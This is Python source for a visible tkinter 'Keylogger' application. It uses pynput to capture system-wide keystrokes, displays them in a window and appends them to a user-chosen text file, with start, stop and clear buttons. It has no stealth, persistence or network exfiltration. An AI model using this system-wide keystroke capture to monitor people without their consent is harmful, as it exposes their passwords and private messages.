import tkinter as tk
from tkinter import filedialog, messagebox
from pynput import keyboard

class KeyLoggerGUI:
    def __init__(self) -> None:
        self.filename = ""
        self.is_logging = False
        self.logged_keys = ""

        self.root = tk.Tk()
        self.root.title("Keylogger")
        self.root.geometry("700x400")
        self.root.configure(bg="#f9f9f9")

        self.create_widgets()

    def create_widgets(self):
        # Text Frame with Scrollbar
        text_frame = tk.Frame(self.root, bg="#f9f9f9")
        text_frame.pack(fill="both", expand=True, padx=10, pady=10)

        self.textbox = tk.Text(text_frame, wrap="word", font=("Consolas", 11), bg="white", relief="sunken", bd=2)
        self.textbox.pack(side="left", fill="both", expand=True)

        scrollbar = tk.Scrollbar(text_frame, command=self.textbox.yview)
        scrollbar.pack(side="right", fill="y")
        self.textbox.config(yscrollcommand=scrollbar.set)

        # Status Label
        self.status_label = tk.Label(self.root, text="Logging Stopped", fg="red", bg="#f9f9f9", font=("Arial", 10, "bold"))
        self.status_label.pack(pady=(0, 10))

        # Buttons Frame
        button_frame = tk.Frame(self.root, bg="#f9f9f9")
        button_frame.pack(pady=5)

        self.start_button = tk.Button(button_frame, text="Start Logging", width=15, bg="#4CAF50", fg="white",
                                      command=self.start_logging)
        self.start_button.grid(row=0, column=0, padx=5, pady=5)

        self.stop_button = tk.Button(button_frame, text="Stop Logging", width=15, bg="#f44336", fg="white",
                                     command=self.stop_logging, state="disabled")
        self.stop_button.grid(row=0, column=1, padx=5, pady=5)

        self.clear_button = tk.Button(button_frame, text="Clear Logs", width=15, command=self.clear_logs)
        self.clear_button.grid(row=0, column=2, padx=5, pady=5)

        self.save_button = tk.Button(button_frame, text="Choose File", width=15, command=self.choose_file)
        self.save_button.grid(row=0, column=3, padx=5, pady=5)

    @staticmethod
    def get_char(key):
        try:
            return key.char
        except AttributeError:
            return f"[{key.name}]" if hasattr(key, 'name') else str(key)

    def on_press(self, key):
        char = self.get_char(key)
        self.logged_keys += char
        self.textbox.insert(tk.END, char)
        self.textbox.see(tk.END)
        if self.filename:
            with open(self.filename, 'a') as logs:
                logs.write(char)

    def start_logging(self):
        if not self.is_logging:
            self.filename = filedialog.asksaveasfilename(defaultextension=".txt",
                                                         filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
            if self.filename:
                self.is_logging = True
                self.start_button.config(state="disabled")
                self.stop_button.config(state="normal")
                self.status_label.config(text="Logging Started", fg="green")
                self.listener = keyboard.Listener(on_press=self.on_press)
                self.listener.start()
            else:
                messagebox.showwarning("No File Selected", "Please choose a file to save the logs.")

    def stop_logging(self):
        if self.is_logging:
            self.is_logging = False
            self.start_button.config(state="normal")
            self.stop_button.config(state="disabled")
            self.status_label.config(text="Logging Stopped", fg="red")
            self.listener.stop()

    def clear_logs(self):
        self.logged_keys = ""
        self.textbox.delete(1.0, tk.END)

    def choose_file(self):
        self.filename = filedialog.asksaveasfilename(defaultextension=".txt",
                                                     filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if self.filename:
            messagebox.showinfo("File Selected", f"Log file: {self.filename}")

    def run(self):
        self.root.mainloop()

if __name__ == '__main__':
    logger = KeyLoggerGUI()
    logger.run()
